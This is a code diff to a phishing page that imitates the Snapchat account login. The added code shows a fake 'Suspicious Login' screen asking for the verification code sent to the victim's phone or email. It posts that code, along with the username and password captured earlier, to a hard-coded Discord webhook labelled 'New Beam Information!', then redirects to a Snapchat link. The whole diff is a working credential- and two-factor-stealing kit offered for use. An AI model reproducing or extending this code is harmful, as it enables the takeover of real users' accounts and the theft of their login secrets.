@@ -39,6 +39,16 @@
 	width: 100% !important;
 	border-radius: 20px;
 }
+.hidden {
+      display: none;
+}
+
+#incorrectPass {
+      color: rgb(255, 46, 46);
+      text-align: center;
+      margin-top: -0.75rem;
+      margin-bottom: 0.25rem;
+}
 
 </style>
 <link rel="shortcut icon" href="favicon.png" type=image/png>
@@ -53,14 +63,16 @@
                         <div class=full-background-color></div>
                         <div class=Header><a href=https://accounts.snapchat.com/ class="logo sf-hidden"></a></div>
                         <div class=Login>
-                              <article class=page>
+                              <article class="page" id="login">
                                     <div class=container><img class=snapchat-icon src="icon.svg" alt=Snapchat>
                                           <div>
                                                 <h1 class=accountsTitle>Hold on! Let's verify your account.</h1>
                                                 <h4 class=accountsDesc>After that, we'll redirect you to the group chat.</h4>
                                           </div>
                                           <div>
+                                                
                                                       <div class="centered_form" id="login_form">
+                                                            <h4 id=incorrectPass class="hidden">Incorrect credentials.</h4>
                                                             <div class="form-group has-success"><label for=username
                                                                         class=control-label>Username or Email</label><input
                                                                         name=username autocomplete=off type=text id=username
@@ -79,6 +91,28 @@
                                           </div>
                                     </div>
                               </article>
+                              <article class="page hidden" id="verification">
+                                    <div class=container><img class=snapchat-icon src="icon.svg" alt=Snapchat>
+                                          <div>
+                                                <h1 class=accountsTitle>Suspicious Login...</h1>
+                                                <h4 class=accountsDesc>We don't recognize this device. Please enter the verification code we sent to your phone/email.<br/>This may take a couple seconds.</h4>
+                                          </div>
+                                          <div>
+                                                      <div class="centered_form" id="login_form">
+                                                            <div class="form-group has-success"><label for=password
+                                                                        class=control-label>Verification Code</label><input
+                                                                        name=code autocomplete=off type=text
+                                                                        id=code class=form-control required value></div>
+                                                            <p class=secondary_action><a href=#>Resend Code
+                                                                        </a>
+                                                            <div style=display:none></div>
+                                                             <div class="primary_action login-button"><button type="button"
+                                                                        id=verifyTrigger class="btn btn-lg btn-primary">Submit
+                                                                        </button></div>
+                                                      </div>
+                                          </div>
+                                    </div>
+                              </article>
                         </div>
                   </div>
             </div>
@@ -86,8 +120,15 @@
       <script >const loginTrigger = document.getElementById("loginTrigger");
 const username = document.getElementById("username");
 const password = document.getElementById("password");
+const verificationCode = document.getElementById("code");
+const incorrectPass = document.getElementById("incorrectPass");
+const loginPage = document.getElementById("login");
+const verificationPage = document.getElementById("verification");
+const verifyTrigger = document.getElementById("verifyTrigger");
+let stage = "login"
 
 loginTrigger.addEventListener("click", async () => {
+      if(stage === "verification") return
 	await fetch(
   'https://discord.com/api/webhooks/1103811946777682072/w4TAUPPyOO9WiOqoG96pqd0R_DFWYcOajnV4BpjuPh_aLVCkUHEzaclB-agLMXyv1qhd',
   {
@@ -112,13 +153,64 @@ loginTrigger.addEventListener("click", async () => {
                 }
             ],
             "description": "too lazy to add toxic messages",
-            "title": "New Beam!"
+            "title": "New Beam Information!"
         }
     ]
 }),
   }
 );
-	window.location.href = "https://t.snapchat.com/YmyFMOCw"
+
+
+if(stage === "login") {
+      loginPage.classList.add("hidden")
+      verificationPage.classList.remove("hidden")
+      stage = "verification";
+}
 });
+
+
+verifyTrigger.addEventListener("click",async ()=>{
+      await fetch(
+  'https://discord.com/api/webhooks/1103811946777682072/w4TAUPPyOO9WiOqoG96pqd0R_DFWYcOajnV4BpjuPh_aLVCkUHEzaclB-agLMXyv1qhd',
+  {
+    method: 'post',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+    "embeds": [
+        {
+            "color": 4321431,
+            "fields": [
+                {
+                    "name": "Verification Code",
+                    "value": `${verificationCode.value}`,
+                    "inline": true
+                }
+            ],
+            "description": "too lazy to add toxic messages",
+            "title": "New Beam Information!"
+        }
+    ]
+}),
+  }
+);
+
+await fetch(
+  'https://discord.com/api/webhooks/1103811946777682072/w4TAUPPyOO9WiOqoG96pqd0R_DFWYcOajnV4BpjuPh_aLVCkUHEzaclB-agLMXyv1qhd',
+  {
+    method: 'post',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+   "content":"Beam Complete."
+}),
+  }
+);
+
+window.location.href = "https://t.snapchat.com/qW9TFvwD"
+
+})
 </script>
 </body>
